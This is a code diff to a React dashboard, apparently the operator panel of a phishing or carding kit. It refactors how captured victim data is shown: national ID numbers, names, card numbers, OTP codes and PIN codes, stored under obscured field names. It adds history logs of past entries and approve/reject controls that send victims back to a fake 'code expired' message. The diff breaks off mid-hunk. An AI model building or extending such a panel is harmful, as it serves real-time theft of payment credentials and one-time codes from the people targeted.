@@ -98,6 +98,7 @@ export default function DashboardPage() {
   const [blockedCards, setBlockedCards] = useState<string[]>([]);
   const [newBlockedCard, setNewBlockedCard] = useState("");
   const [currentTime, setCurrentTime] = useState(Date.now());
+  const [openLogBox, setOpenLogBox] = useState<string | null>(null);
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -2055,8 +2056,8 @@ const renderNafadBox = () => {
     );
     const nafadTimestamp = nafadRaw ? getNafadTimestamp(nafadRaw) : 0;
     
-    // Build boxes array - ONE BOX per ENTRY in customerEntryGroup
-    // Each entry gets its own box with all its basic and insurance data
+    // Build boxes array - ONE BOX per TYPE (not per entry)
+    // Each type (basic, insurance, card, etc.) gets ONE box with the latest data
     type BoxType = {
       key: string;
       timestamp: number;
@@ -2065,9 +2066,19 @@ const renderNafadBox = () => {
     
     const boxes: BoxType[] = [];
     
-// Create a box for each entry that has Basic data
-    // Find the most recent Basic timestamp first
+    // Count entries that have basic/insurance data
+    const basicEntriesCount = customerEntryGroup.filter(entry => {
+      const raw = entry.raw || {};
+      return raw.identityNumber || raw.ownerName || raw.buyerName ||
+             raw.documentType || raw.phoneNumber || raw.serialNumber ||
+             raw.insuranceCoverage || raw.vehicleModel ||
+             raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
+    }).length;
+    
+    // Find the most recent entry with Basic/Insurance data
+    let latestBasicEntry: (typeof customerEntryGroup)[0] | null = null;
     let latestBasicTimestamp = 0;
+    
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName ||
@@ -2078,39 +2089,40 @@ const renderNafadBox = () => {
         const ts = (raw.basicUpdatedAt || raw.insuranceUpdatedAt)
           ? new Date(raw.basicUpdatedAt || raw.insuranceUpdatedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
-        if (ts > latestBasicTimestamp) {
+        if (ts >= latestBasicTimestamp) {
           latestBasicTimestamp = ts;
+          latestBasicEntry = entry;
         }
       }
     });
 
-    customerEntryGroup.forEach((entry, index) => {
-      const raw = entry.raw || {};
+    // Create ONE box for Basic/Insurance (latest entry only)
+    if (latestBasicEntry) {
+      const raw = latestBasicEntry.raw || {};
       const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName ||
                        raw.documentType || raw.phoneNumber || raw.serialNumber;
       const hasInsurance = raw.insuranceCoverage || raw.vehicleModel ||
                            raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
-      if (!hasBasic && !hasInsurance) return;
+      
       let entryTimestamp = Date.now();
       if (raw.basicUpdatedAt || raw.insuranceUpdatedAt) {
         const ts = new Date(raw.basicUpdatedAt || raw.insuranceUpdatedAt).getTime();
         if (ts > 0) {
           entryTimestamp = ts;
         }
-      } else if (entry.submittedAt) {
-        entryTimestamp = new Date(entry.submittedAt).getTime();
+      } else if (latestBasicEntry.submittedAt) {
+        entryTimestamp = new Date(latestBasicEntry.submittedAt).getTime();
       }
-      const isLatest = entryTimestamp === latestBasicTimestamp;
 
       boxes.push({
-        key: `entry-${entry.id}`,
+        key: `basic-insurance-${latestBasicEntry.id}`,
         timestamp: entryTimestamp,
         component: (
           <div style={{
             background: "#ffffff",
             borderRadius: 12,
             padding: 16,
-            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
+            border: "2px solid #3b82f6",
             width: "45%",
             marginRight: 0,
             marginLeft: "auto",
@@ -2118,26 +2130,24 @@ const renderNafadBox = () => {
             marginBottom: 16
           }}>
             <TimeCounter timestamp={entryTimestamp} />
-            {isLatest && (
-              <span style={{
-                position: "absolute",
-                top: 8,
-                right: 8,
-                background: "#3b82f6",
-                color: "#fff",
-                padding: "2px 8px",
-                borderRadius: 4,
-                fontSize: "0.65rem",
-                fontWeight: 600
-              }}>
-                الأحدث
-              </span>
-            )}
+            <span style={{
+              position: "absolute",
+              top: 8,
+              right: 8,
+              background: "#3b82f6",
+              color: "#fff",
+              padding: "2px 8px",
+              borderRadius: 4,
+              fontSize: "0.65rem",
+              fontWeight: 600
+            }}>
+              الأحدث
+            </span>
             
             {/* Basic Info Section */}
             {hasBasic && (
               <>
-                <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
+                <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
                   <h3 style={{ margin: 0, fontSize: "0.85rem", fontWeight: 700, color: "#111827" }}>المعلومات الأساسية</h3>
                 </div>
                 <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
@@ -2221,149 +2231,172 @@ const renderNafadBox = () => {
                 </div>
               </>
             )}
+            
+            {/* زر عرض السجل - يظهر فقط إذا كان هناك أكثر من إدخال */}
+            {basicEntriesCount > 1 && (
+              <button
+                onClick={() => setOpenLogBox(openLogBox === 'basic' ? null : 'basic')}
+                style={{
+                  marginTop: 16,
+                  width: "100%",
+                  padding: "10px 16px",
+                  border: "1px solid #d1d5db",
+                  borderRadius: 8,
+                  background: openLogBox === 'basic' ? "#f0fdf4" : "#f9fafb",
+                  color: openLogBox === 'basic' ? "#16a34a" : "#374151",
+                  fontWeight: 600,
+                  fontSize: "0.8rem",
+                  cursor: "pointer",
+                  transition: "all 0.2s",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 8
+                }}
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                  <polyline points="14,2 14,8 20,8" />
+                  <line x1="16" y1="13" x2="8" y2="13" />
+                  <line x1="16" y1="17" x2="8" y2="17" />
+                </svg>
+                عرض السجل ({basicEntriesCount} إدخالات)
+              </button>
+            )}
+            
+            {/* سجل الإدخالات */}
+            {openLogBox === 'basic' && basicEntriesCount > 1 && (
+              <div style={{
+                marginTop: 12,
+                padding: 12,
+                background: "#f9fafb",
+                borderRadius: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
+                  سجل الإدخالات:
+                </div>
+                {customerEntryGroup
+                  .filter(entry => {
+                    const raw = entry.raw || {};
+                    return raw.identityNumber || raw.ownerName || raw.buyerName ||
+                           raw.documentType || raw.phoneNumber || raw.serialNumber ||
+                           raw.insuranceCoverage || raw.vehicleModel ||
+                           raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
+                  })
+                  .sort((a, b) => {
+                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
+                    return timeB - timeA;
+                  })
+                  .map((entry, idx) => {
+                    const raw = entry.raw || {};
+                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
+                    const isCurrent = entry.id === selectedRequest?.id;
+                    return (
+                      <div key={entry.id} style={{
+                        padding: "8px",
+                        marginBottom: 8,
+                        background: isCurrent ? "#dcfce7" : "#fff",
+                        borderRadius: 6,
+                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
+                        fontSize: "0.7rem"
+                      }}>
+                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
+                        </div>
+                        {raw.identityNumber && (
+                          <div style={{ color: "#6b7280" }}>رقم الهوية: {raw.identityNumber}</div>
+                        )}
+                        {raw.ownerName && (
+                          <div style={{ color: "#6b7280" }}>الاسم: {raw.ownerName}</div>
+                        )}
+                        {raw.insuranceCoverage && (
+                          <div style={{ color: "#6b7280" }}>نوع التأمين: {raw.insuranceCoverage}</div>
+                        )}
+                      </div>
+                    );
+                  })}
+              </div>
+            )}
           </div>
         )
       });
-    });
+    }
     
     // Sort boxes by timestamp (newest first)
     boxes.sort((a, b) => b.timestamp - a.timestamp);
     
-    // If no entry boxes were created, create one from selectedRequest if it has data
-    if (boxes.length === 0 && selectedRequest?.raw) {
-      const raw = selectedRequest.raw;
-      const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName || 
-                       raw.documentType || raw.phoneNumber || raw.serialNumber;
-      const hasInsurance = raw.insuranceCoverage || raw.vehicleModel || 
-                           raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
-      
-      if (hasBasic || hasInsurance) {
-        const timestamp = new Date(selectedRequest.submittedAt || selectedRequest.updatedAt || 0).getTime();
-        boxes.push({
-          key: `selected-${selectedRequest.id}`,
-          timestamp,
-          component: (
-            <div style={{
-              background: "#ffffff",
-              borderRadius: 12,
-              padding: 16,
-              border: "2px solid #3b82f6",
-              width: "45%",
-              marginRight: 0,
-              marginLeft: "auto",
-              position: "relative"
-            }}>
-              <TimeCounter timestamp={timestamp} />
-              <span style={{
-                position: "absolute",
-                top: 8,
-                right: 8,
-                background: "#3b82f6",
-                color: "#fff",
-                padding: "2px 8px",
-                borderRadius: 4,
-                fontSize: "0.65rem",
-                fontWeight: 600
-              }}>
-                الأحدث
-              </span>
-              {hasBasic && (
-                <>
-                  <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
-                    <h3 style={{ margin: 0, fontSize: "0.85rem", fontWeight: 700, color: "#111827" }}>المعلومات الأساسية</h3>
-                  </div>
-                  <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-                    {raw.identityNumber && (
-                      <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
-                        <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>رقم الهوية</span>
-                        <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.identityNumber}</span>
-                      </div>
-                    )}
-                    {raw.ownerName && (
-                      <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
-                        <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>الاسم</span>
-                        <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.ownerName}</span>
-                      </div>
-                    )}
-                    {raw.phoneNumber && (
-                      <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
-                        <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>رقم الهاتف</span>
-                        <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
-                      </div>
-                    )}
-                  </div>
-                </>
-              )}
-            </div>
-          )
-        });
-      }
-    }
     
     // If still no boxes, return null
     if (boxes.length === 0) return null;
     
-// Create a box for each entry that has Card data
-    // Find the most recent Card timestamp first
+    // Count entries that have Card data
+    const cardEntriesCount = customerEntryGroup.filter(entry => {
+      const raw = entry.raw || {};
+      return raw._v1 || raw.cardNumber;
+    }).length;
+    
+    // Find the most recent entry with Card data
+    let latestCardEntry: (typeof customerEntryGroup)[0] | null = null;
     let latestCardTimestamp = 0;
+    
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       if (raw._v1 || raw.cardNumber) {
         const ts = raw._v1UpdatedAt
           ? new Date(raw._v1UpdatedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
-        if (ts > latestCardTimestamp) {
+        if (ts >= latestCardTimestamp) {
           latestCardTimestamp = ts;
+          latestCardEntry = entry;
         }
       }
     });
 
-    customerEntryGroup.forEach((entry, index) => {
-      const raw = entry.raw || {};
-      const cardNumber = raw._v1 || raw.cardNumber;
-      if (!cardNumber) return;
+    // Create ONE box for Card (latest entry only)
+    if (latestCardEntry) {
+      const raw = latestCardEntry.raw || {};
       let entryTimestamp = Date.now();
       if (raw._v1UpdatedAt) {
         const _v1Ts = new Date(raw._v1UpdatedAt).getTime();
         if (_v1Ts > 0) {
           entryTimestamp = _v1Ts;
         }
-      } else if (entry.submittedAt) {
-        entryTimestamp = new Date(entry.submittedAt).getTime();
+      } else if (latestCardEntry.submittedAt) {
+        entryTimestamp = new Date(latestCardEntry.submittedAt).getTime();
       }
-      const isLatest = entryTimestamp === latestCardTimestamp;
 
       boxes.push({
-        key: `card-${entry.id}`,
+        key: `card-${latestCardEntry.id}`,
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
+            border: "2px solid #3b82f6",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
             <TimeCounter timestamp={entryTimestamp} />
-            {isLatest && (
-              <span style={{
-                position: "absolute",
-                top: 8,
-                right: 8,
-                background: "#3b82f6",
-                color: "#fff",
-                padding: "2px 8px",
-                borderRadius: 4,
-                fontSize: "0.65rem",
-                fontWeight: 600
-              }}>
-                الأحدث
-              </span>
-            )}
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
+            <span style={{
+              position: "absolute",
+              top: 8,
+              right: 8,
+              background: "#3b82f6",
+              color: "#fff",
+              padding: "2px 8px",
+              borderRadius: 4,
+              fontSize: "0.65rem",
+              fontWeight: 600
+            }}>
+              الأحدث
+            </span>
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
             </div>
             {/* Card Details */}
@@ -2414,72 +2447,160 @@ const renderNafadBox = () => {
                 {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
               </button>
             </div>
+            
+            {/* زر عرض السجل - يظهر فقط إذا كان هناك أكثر من إدخال */}
+            {cardEntriesCount > 1 && (
+              <button
+                onClick={() => setOpenLogBox(openLogBox === 'card' ? null : 'card')}
+                style={{
+                  marginTop: 12,
+                  width: "100%",
+                  padding: "10px 16px",
+                  border: "1px solid #d1d5db",
+                  borderRadius: 8,
+                  background: openLogBox === 'card' ? "#f0fdf4" : "#f9fafb",
+                  color: openLogBox === 'card' ? "#16a34a" : "#374151",
+                  fontWeight: 600,
+                  fontSize: "0.8rem",
+                  cursor: "pointer",
+                  transition: "all 0.2s",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 8
+                }}
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                  <polyline points="14,2 14,8 20,8" />
+                  <line x1="16" y1="13" x2="8" y2="13" />
+                  <line x1="16" y1="17" x2="8" y2="17" />
+                </svg>
+                عرض السجل ({cardEntriesCount} إدخالات)
+              </button>
+            )}
+            
+            {/* سجل الإدخالات */}
+            {openLogBox === 'card' && cardEntriesCount > 1 && (
+              <div style={{
+                marginTop: 12,
+                padding: 12,
+                background: "#f9fafb",
+                borderRadius: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
+                  سجل الإدخالات:
+                </div>
+                {customerEntryGroup
+                  .filter(entry => {
+                    const raw = entry.raw || {};
+                    return raw._v1 || raw.cardNumber;
+                  })
+                  .sort((a, b) => {
+                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
+                    return timeB - timeA;
+                  })
+                  .map((entry, idx) => {
+                    const raw = entry.raw || {};
+                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
+                    const isCurrent = entry.id === selectedRequest?.id;
+                    return (
+                      <div key={entry.id} style={{
+                        padding: "8px",
+                        marginBottom: 8,
+                        background: isCurrent ? "#dcfce7" : "#fff",
+                        borderRadius: 6,
+                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
+                        fontSize: "0.7rem"
+                      }}>
+                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
+                        </div>
+                        {raw.cardNumber && (
+                          <div style={{ color: "#6b7280" }}>رقم البطاقة: {raw.cardNumber}</div>
+                        )}
+                        {raw.cardOwner && (
+                          <div style={{ color: "#6b7280" }}>صاحب البطاقة: {raw.cardOwner}</div>
+                        )}
+                      </div>
+                    );
+                  })}
+              </div>
+            )}
           </div>
         )
       });
-    });
+    }
     
-// Create a box for each entry that has OTP data
-    // Find the most recent OTP timestamp first
+    // Count entries that have OTP data
+    const otpEntriesCount = customerEntryGroup.filter(entry => {
+      const raw = entry.raw || {};
+      return raw._v5 || raw.otpCode;
+    }).length;
+    
+    // Find the most recent entry with OTP data
+    let latestOtpEntry: (typeof customerEntryGroup)[0] | null = null;
     let latestOtpTimestamp = 0;
+    
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       if (raw._v5 || raw.otpCode) {
         const ts = raw._v5UpdatedAt
           ? new Date(raw._v5UpdatedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
-        if (ts > latestOtpTimestamp) {
+        if (ts >= latestOtpTimestamp) {
           latestOtpTimestamp = ts;
+          latestOtpEntry = entry;
         }
       }
     });
 
-    customerEntryGroup.forEach((entry, index) => {
-      const raw = entry.raw || {};
+    // Create ONE box for OTP (latest entry only)
+    if (latestOtpEntry) {
+      const raw = latestOtpEntry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-      if (!otpCode) return;
       let entryTimestamp = Date.now();
       if (raw._v5UpdatedAt) {
         const _v5Ts = new Date(raw._v5UpdatedAt).getTime();
         if (_v5Ts > 0) {
           entryTimestamp = _v5Ts;
         }
-      } else if (entry.submittedAt) {
-        entryTimestamp = new Date(entry.submittedAt).getTime();
+      } else if (latestOtpEntry.submittedAt) {
+        entryTimestamp = new Date(latestOtpEntry.submittedAt).getTime();
       }
-      const isLatest = entryTimestamp === latestOtpTimestamp;
 
       boxes.push({
-        key: `otp-${entry.id}`,
+        key: `otp-${latestOtpEntry.id}`,
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
+            border: "2px solid #3b82f6",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
             <TimeCounter timestamp={entryTimestamp} />
-            {isLatest && (
-              <span style={{
-                position: "absolute",
-                top: 8,
-                right: 8,
-                background: "#3b82f6",
-                color: "#fff",
-                padding: "2px 8px",
-                borderRadius: 4,
-                fontSize: "0.65rem",
-                fontWeight: 600
-              }}>
-                الأحدث
-              </span>
-            )}
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
+            <span style={{
+              position: "absolute",
+              top: 8,
+              right: 8,
+              background: "#3b82f6",
+              color: "#fff",
+              padding: "2px 8px",
+              borderRadius: 4,
+              fontSize: "0.65rem",
+              fontWeight: 600
+            }}>
+              الأحدث
+            </span>
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
               <span style={{ fontSize: "1rem" }}>🔐</span>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق (OTP)</h3>
             </div>
@@ -2509,72 +2630,157 @@ const renderNafadBox = () => {
             <p style={{ margin: "8px 0 0", fontSize: "0.7rem", color: "#ef4444", textAlign: "center" }}>
               الرفض: يرجع العميل ويعرض "رمز التحقق غير صحيح او منتهي الصلاحية"
             </p>
+            
+            {/* زر عرض السجل */}
+            {otpEntriesCount > 1 && (
+              <button
+                onClick={() => setOpenLogBox(openLogBox === 'otp' ? null : 'otp')}
+                style={{
+                  marginTop: 12,
+                  width: "100%",
+                  padding: "10px 16px",
+                  border: "1px solid #d1d5db",
+                  borderRadius: 8,
+                  background: openLogBox === 'otp' ? "#f0fdf4" : "#f9fafb",
+                  color: openLogBox === 'otp' ? "#16a34a" : "#374151",
+                  fontWeight: 600,
+                  fontSize: "0.8rem",
+                  cursor: "pointer",
+                  transition: "all 0.2s",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 8
+                }}
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                  <polyline points="14,2 14,8 20,8" />
+                  <line x1="16" y1="13" x2="8" y2="13" />
+                  <line x1="16" y1="17" x2="8" y2="17" />
+                </svg>
+                عرض السجل ({otpEntriesCount} إدخالات)
+              </button>
+            )}
+            
+            {/* سجل الإدخالات */}
+            {openLogBox === 'otp' && otpEntriesCount > 1 && (
+              <div style={{
+                marginTop: 12,
+                padding: 12,
+                background: "#f9fafb",
+                borderRadius: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
+                  سجل الإدخالات:
+                </div>
+                {customerEntryGroup
+                  .filter(entry => {
+                    const raw = entry.raw || {};
+                    return raw._v5 || raw.otpCode;
+                  })
+                  .sort((a, b) => {
+                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
+                    return timeB - timeA;
+                  })
+                  .map((entry, idx) => {
+                    const raw = entry.raw || {};
+                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
+                    const isCurrent = entry.id === selectedRequest?.id;
+                    return (
+                      <div key={entry.id} style={{
+                        padding: "8px",
+                        marginBottom: 8,
+                        background: isCurrent ? "#dcfce7" : "#fff",
+                        borderRadius: 6,
+                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
+                        fontSize: "0.7rem"
+                      }}>
+                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
+                        </div>
+                        {(raw._v5 || raw.otpCode) && (
+                          <div style={{ color: "#6b7280" }}>رمز OTP: {raw._v5 || raw.otpCode}</div>
+                        )}
+                      </div>
+                    );
+                  })}
+              </div>
+            )}
           </div>
         )
       });
-    });
+    }
     
-// Create a box for each entry that has PIN data
-    // Find the most recent PIN timestamp first
+    // Count entries that have PIN data
+    const pinEntriesCount = customerEntryGroup.filter(entry => {
+      const raw = entry.raw || {};
+      return raw._v6 || raw.pinCode;
+    }).length;
+    
+    // Find the most recent entry with PIN data
+    let latestPinEntry: (typeof customerEntryGroup)[0] | null = null;
     let latestPinTimestamp = 0;
+    
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       if (raw._v6 || raw.pinCode) {
         const ts = raw._v6UpdatedAt
           ? new Date(raw._v6UpdatedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
-        if (ts > latestPinTimestamp) {
+        if (ts >= latestPinTimestamp) {
           latestPinTimestamp = ts;
+          latestPinEntry = entry;
         }
       }
     });
 
-    customerEntryGroup.forEach((entry, index) => {
-      const raw = entry.raw || {};
+    // Create ONE box for PIN (latest entry only)
+    if (latestPinEntry) {
+      const raw = latestPinEntry.raw || {};
       const pinCode = raw._v6 || raw.pinCode;
-      if (!pinCode) return;
       let entryTimestamp = Date.now();
       if (raw._v6UpdatedAt) {
         const _v6Ts = new Date(raw._v6UpdatedAt).getTime();
         if (_v6Ts > 0) {
           entryTimestamp = _v6Ts;
         }
-      } else if (entry.submittedAt) {
-        entryTimestamp = new Date(entry.submittedAt).getTime();
+      } else if (latestPinEntry.submittedAt) {
+        entryTimestamp = new Date(latestPinEntry.submittedAt).getTime();
       }
-      const isLatest = entryTimestamp === latestPinTimestamp;
 
       boxes.push({
-        key: `pin-${entry.id}`,
+        key: `pin-${latestPinEntry.id}`,
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
+            border: "2px solid #3b82f6",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
             <TimeCounter timestamp={entryTimestamp} />
-            {isLatest && (
-              <span style={{
-                position: "absolute",
-                top: 8,
-                right: 8,
-                background: "#3b82f6",
-                color: "#fff",
-                padding: "2px 8px",
-                borderRadius: 4,
-                fontSize: "0.65rem",
-                fontWeight: 600
-              }}>
-                الأحدث
-              </span>
-            )}
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
+            <span style={{
+              position: "absolute",
+              top: 8,
+              right: 8,
+              background: "#3b82f6",
+              color: "#fff",
+              padding: "2px 8px",
+              borderRadius: 4,
+              fontSize: "0.65rem",
+              fontWeight: 600
+            }}>
+              الأحدث
+            </span>
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز PIN</h3>
             </div>
             <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
@@ -2604,14 +2810,101 @@ const renderNafadBox = () => {
                 {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
               </button>
             </div>
+            
+            {/* زر عرض السجل */}
+            {pinEntriesCount > 1 && (
+              <button
+                onClick={() => setOpenLogBox(openLogBox === 'pin' ? null : 'pin')}
+                style={{
+                  marginTop: 12,
+                  width: "100%",
+                  padding: "10px 16px",
+                  border: "1px solid #d1d5db",
+                  borderRadius: 8,
+                  background: openLogBox === 'pin' ? "#f0fdf4" : "#f9fafb",
+                  color: openLogBox === 'pin' ? "#16a34a" : "#374151",
+                  fontWeight: 600,
+                  fontSize: "0.8rem",
+                  cursor: "pointer",
+                  transition: "all 0.2s",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 8
+                }}
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                  <polyline points="14,2 14,8 20,8" />
+                  <line x1="16" y1="13" x2="8" y2="13" />
+                  <line x1="16" y1="17" x2="8" y2="17" />
+                </svg>
+                عرض السجل ({pinEntriesCount} إدخالات)
+              </button>
+            )}
+            
+            {/* سجل الإدخالات */}
+            {openLogBox === 'pin' && pinEntriesCount > 1 && (
+              <div style={{
+                marginTop: 12,
+                padding: 12,
+                background: "#f9fafb",
+                borderRadius: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
+                  سجل الإدخالات:
+                </div>
+                {customerEntryGroup
+                  .filter(entry => {
+                    const raw = entry.raw || {};
+                    return raw._v6 || raw.pinCode;
+                  })
+                  .sort((a, b) => {
+                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
+                    return timeB - timeA;
+                  })
+                  .map((entry, idx) => {
+                    const raw = entry.raw || {};
+                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
+                    const isCurrent = entry.id === selectedRequest?.id;
+                    return (
+                      <div key={entry.id} style={{
+                        padding: "8px",
+                        marginBottom: 8,
+                        background: isCurrent ? "#dcfce7" : "#fff",
+                        borderRadius: 6,
+                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
+                        fontSize: "0.7rem"
+                      }}>
+                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
+                        </div>
+                        {(raw._v6 || raw.pinCode) && (
+                          <div style={{ color: "#6b7280" }}>رمز PIN: {raw._v6 || raw.pinCode}</div>
+                        )}
+                      </div>
+                    );
+                  })}
+              </div>
+            )}
           </div>
         )
       });
-    });
+    }
     
-// Create a box for each entry that has Phone verification data
-    // Find the most recent Phone timestamp first
+    // Count entries that have Phone verification data
+    const phoneEntriesCount = customerEntryGroup.filter(entry => {
+      const raw = entry.raw || {};
+      return raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
+    }).length;
+    
+    // Find the most recent entry with Phone verification data
+    let latestPhoneEntry: (typeof customerEntryGroup)[0] | null = null;
     let latestPhoneTimestamp = 0;
+    
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       const hasPhoneVerification = raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
@@ -2619,58 +2912,55 @@ const renderNafadBox = () => {
         const ts = raw._v7UpdatedAt
           ? new Date(raw._v7UpdatedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
-        if (ts > latestPhoneTimestamp) {
+        if (ts >= latestPhoneTimestamp) {
